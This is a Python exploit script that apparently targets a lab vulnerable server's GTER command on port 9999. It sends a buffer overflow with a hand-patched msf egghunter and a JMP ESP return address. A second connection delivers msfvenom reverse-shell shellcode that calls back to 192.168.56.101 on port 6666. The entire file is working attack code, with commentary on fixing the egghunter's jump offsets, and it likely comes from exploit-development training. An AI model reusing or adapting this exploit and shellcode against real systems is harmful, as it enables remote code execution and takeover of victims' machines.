import socket
import struct

HOST = '192.168.56.102'
PORT = 9999

# msf-egghunter -e mike -f python -v EGGHUNTER
# egg = 'mike' = x6d x69 x6b x65
# here we replaced 1 byte "x43" (inc edx) with three bytes -->  add edx,0x1 (x83 xC2 x01)
# Note that with this updated shellcode the program will crash instantly and not start the search for the egg to start the second stage payload. In order for that to happen we need to update some relative jumps since the payload increased in size

#Original egghunter
#EGGHUNTER =  b""
#EGGHUNTER += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
#EGGHUNTER += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x6d\x69\x6b\x65"
#EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# 74EF jz 0x0 ; Jump back to start dx; Needs to be replaced with:74ED
# 75EA jnz 0x5 ; jump to line 1 if the egg was not found; Needs to be replaced with 75E8
# 75E7 jnz 0x5 ; jump to line 1 if the second egg is not found; Needs to be replaced with 75E5



EGGHUNTER =  b""
EGGHUNTER += b"\x66\x81\xca\xff\x0f\x83\xc2\x01\x52\x6a\x02\x58\xcd"
EGGHUNTER += b"\x2e\x3c\x05\x5a\x74\xed\xb8\x6d\x69\x6b\x65"
EGGHUNTER += b"\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7"


#OLD:  msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00'
#NEW:  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=6666 EXITFUNC=thread -f python -v SHELL -b '\x00'
#prepend with double egg mikemike 

SHELL =  b"mikemike"
SHELL += b"\xd9\xe8\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52\xba"
SHELL += b"\x40\x2c\xee\xa1\x31\x50\x17\x03\x50\x17\x83\xa8"
SHELL += b"\xd0\x0c\x54\xd4\xc1\x53\x97\x24\x12\x34\x11\xc1"
SHELL += b"\x23\x74\x45\x82\x14\x44\x0d\xc6\x98\x2f\x43\xf2"
SHELL += b"\x2b\x5d\x4c\xf5\x9c\xe8\xaa\x38\x1c\x40\x8e\x5b"
SHELL += b"\x9e\x9b\xc3\xbb\x9f\x53\x16\xba\xd8\x8e\xdb\xee"
SHELL += b"\xb1\xc5\x4e\x1e\xb5\x90\x52\x95\x85\x35\xd3\x4a"
SHELL += b"\x5d\x37\xf2\xdd\xd5\x6e\xd4\xdc\x3a\x1b\x5d\xc6"
SHELL += b"\x5f\x26\x17\x7d\xab\xdc\xa6\x57\xe5\x1d\x04\x96"
SHELL += b"\xc9\xef\x54\xdf\xee\x0f\x23\x29\x0d\xad\x34\xee"
SHELL += b"\x6f\x69\xb0\xf4\xc8\xfa\x62\xd0\xe9\x2f\xf4\x93"
SHELL += b"\xe6\x84\x72\xfb\xea\x1b\x56\x70\x16\x97\x59\x56"
SHELL += b"\x9e\xe3\x7d\x72\xfa\xb0\x1c\x23\xa6\x17\x20\x33"
SHELL += b"\x09\xc7\x84\x38\xa4\x1c\xb5\x63\xa1\xd1\xf4\x9b"
SHELL += b"\x31\x7e\x8e\xe8\x03\x21\x24\x66\x28\xaa\xe2\x71"
SHELL += b"\x4f\x81\x53\xed\xae\x2a\xa4\x24\x75\x7e\xf4\x5e"
SHELL += b"\x5c\xff\x9f\x9e\x61\x2a\x0f\xce\xcd\x85\xf0\xbe"
SHELL += b"\xad\x75\x99\xd4\x21\xa9\xb9\xd7\xeb\xc2\x50\x22"
SHELL += b"\x7c\x2d\x0c\x14\x19\xc5\x4f\x64\xfb\x1f\xd9\x82"
SHELL += b"\x91\x0f\x8f\x1d\x0e\xa9\x8a\xd5\xaf\x36\x01\x90"
SHELL += b"\xf0\xbd\xa6\x65\xbe\x35\xc2\x75\x57\xb6\x99\x27"
SHELL += b"\xfe\xc9\x37\x4f\x9c\x58\xdc\x8f\xeb\x40\x4b\xd8"
SHELL += b"\xbc\xb7\x82\x8c\x50\xe1\x3c\xb2\xa8\x77\x06\x76"
SHELL += b"\x77\x44\x89\x77\xfa\xf0\xad\x67\xc2\xf9\xe9\xd3"
SHELL += b"\x9a\xaf\xa7\x8d\x5c\x06\x06\x67\x37\xf5\xc0\xef"
SHELL += b"\xce\x35\xd3\x69\xcf\x13\xa5\x95\x7e\xca\xf0\xaa"
SHELL += b"\x4f\x9a\xf4\xd3\xad\x3a\xfa\x0e\x76\x5a\x19\x9a"
SHELL += b"\x83\xf3\x84\x4f\x2e\x9e\x36\xba\x6d\xa7\xb4\x4e"
SHELL += b"\x0e\x5c\xa4\x3b\x0b\x18\x62\xd0\x61\x31\x07\xd6"
SHELL += b"\xd6\x32\x02"





PAYLOAD = (
    b'GTER /.:/' +
    EGGHUNTER +
    b'A' * (147 - len(EGGHUNTER)) +
    # 625011C7 | FFE4 | jmp esp
    struct.pack('<L', 0x625011C7) +
    # JMP to the start of our buffer
    b'\xe9\x64\xff\xff\xff' +
    b'C' * (400 - 147 - 4 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    print('Sending first stage...')
    fd.sendall(PAYLOAD)
    print('Done.')

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    print('Sending shellcode...')
    fd.sendall(SHELL)
    print('Boom! Dont forget to setup listener at port 6666')
